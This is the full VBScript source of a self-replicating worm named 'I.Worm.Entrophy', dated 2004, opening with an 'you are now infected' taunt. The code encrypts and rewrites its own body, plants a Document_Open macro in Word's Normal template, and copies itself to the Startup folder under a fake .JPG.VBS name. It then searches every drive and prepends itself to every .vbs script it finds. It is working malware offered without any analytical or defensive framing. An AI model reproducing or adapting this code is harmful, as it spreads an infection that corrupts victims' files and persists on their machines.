'By The Time you read this it is already to late,  for your computer has succumbed to the 'entrophy...
'You are now infected by:
'I.Worm.Entrophy by -=[Azag-TH0TH]=-
'(c) Halloween Oct.31, 2004.
'--------------------------------------------------------------------------------------
set fso = createobject("scripting.filesystemobject")
set op = fso.opentextfile(wscript.scriptfullname,1)
set parser = fso.Createtextfile("C:\poly",true)
do while mark <> "'marker"
  mark = op.readline
  for i = 1 to len(mark)
      c = mid(mark,i,1)
      if c = chr(34) then
          Call aaa
      else
          parser.write c
      end if
      if i = len(mark) then
      parser.write vbcrlf
      end if
  next
loop
sub aaa()
Counter = i
do while enc <> chr(34)
  Counter = Counter + 1
  enc = mid(mark,Counter,1)
  if enc = chr(34) then exit do
      If Asc(enc) Mod 2 = 0 Then
          enc1 = Chr(Asc(enc) + 1)
      else
          enc1 = Chr(Asc(enc) - 1)
      end if
  char = char & enc1
loop
all = "decrypt(" & chr(34) & char & chr(34) & ")"
parser.write all
i = Counter
end sub
op.close
parser.close
set back = fso.opentextfile("C:\poly",1)
reader = back.readall
set wrtall = fso.Createtextfile("C:\poly",true)
wrtall.write reader
Function decrypt(x)
  For i = 1 To Len(x)
      polya = Mid(x, i, 1)
      If Asc(polya) <> 34 And Asc(polya) <> 35 Then
          If Asc(polya) Mod 2 = 0 Then
              polya = Chr(Asc(polya) + 1)
          Else
              polya = Chr(Asc(polya) - 1)
          End If
      End If
  decrypt = decrypt & polya
  Next
End Function
fso.copyfile "C:\poly",wscript.scriptfullname
'Devourer of Worlds
wrtall.writeline "Function decrypt(x)"
wrtall.writeline "For i = 1 To Len(x)"
wrtall.writeline "polya = Mid(x, i, 1)"
wrtall.writeline "If Asc(polya) <> 34 And Asc(polya) <> 35 Then"
wrtall.writeline "If Asc(polya) Mod 2 = 0 Then"
wrtall.writeline "polya = Chr(Asc(polya) + 1)"
wrtall.writeline "Else"
wrtall.writeline "polya = Chr(Asc(polya) - 1)"
wrtall.writeline "End If"
wrtall.writeline "End If"
wrtall.writeline "decrypt = decrypt & polya"
wrtall.writeline "Next"
wrtall.writeline "End Function"'Infecting Doc by injecting the script to Normal Temp
set fso = createobject("Scripting.filesystemobject")
set readself = fso.opentextfile(wscript.scriptfullname,1)
code = readself.readall & vbcrlf & "'Only through the Darkness of Christ..."
set backup = fso.createtextfile("C:\doc.1",true)
backup.write code

set opendroperdoc = fso.OpenTextFile("C:\doc.1", 1)
set doc= fso.CreateTextFile("C:\Entrophy.sys", 1)
doc.writeline "Private Sub Document_Open()"&vbcrlf&"Open "&chr(34)&"file.vbs"&chr(34)&" for output as #1"
do while oneline <> "'Only through the Darkness of Christ..."
  oneline = opendroperdoc.readline
  docformat = replace(oneline,chr(34),chr(34)&"&chr(34)&"&chr(34))
  fullline = "? #1," & Chr(34) & docformat & chr(34)
doc.writeline fullline
loop
doc.writeline vbcrlf & "close #1 : Createobject("& chr(34) & "Wscrip.shell" & chr(34) & ").run " & chr(34) & "file.vbs" & chr(34) & " : end sub"
doc.close
opendroperdoc.close
Set wordobj = CreateObject("Word.Application")
Set NT = wordobj.NormalTemplate.VBProject.VBComponents
For h = 1 To NT.Count
If NT(h).Name = "seven_barriers" Then
wordobj.NormalTemplate.Save
wordobj.Quit
wordobj = ""
else
NT.Import "C:\Entrophy.sys"
end if
next
'--------------------------------------------------------------------------------------
fso.copyfile wscript.scriptfullname,"C:\Documents and Settings\All Users\Start Menu\Programs\Startup\InFiniTe_DarKneSS.JPG.VBS"
'Through CHAOS i glimpse the infinite entrophy...as I shatter the seven barriers
set mvbswe = wscript.CreateObject("WScript.Shell")
Set fso = createobject("scripting.filesystemobject")
Set OpenSelf = FSO.OpenTextFile(Wscript.ScriptFullName, 1, True)
Self = OpenSelf.Readall
Set Drives=fso.drives 
For Each Drive in Drives
If drive.isready then
Dosearch drive & "\"
end If 
Next 
function Dosearch(path)

on error resume next
Set Folder=fso.getfolder(path)
Set Files = folder.files
For Each File in files
If fso.GetExtensionName(file.path)="vbs" then
Set Scripts = FSO.OpenTextFile(File.path, 1, True)
If Scripts.ReadLine <> "'Through CHAOS i glimpse the infinite entrophy...as I shatter the seven barriers" then
Set Scripts = FSO.OpenTextFile(File.path, 1, True)
ScriptsSource = Scripts.ReadAll
Set WriteScripts = FSO.OpenTextFile(File.path, 2, True)
WriteScripts.WriteLine Self
WriteScripts.WriteLine ScriptsSource
end if
end if
next
Set Subfolders = folder.SubFolders
For Each Subfolder in Subfolders
Dosearch Subfolder.path 
Next
end function
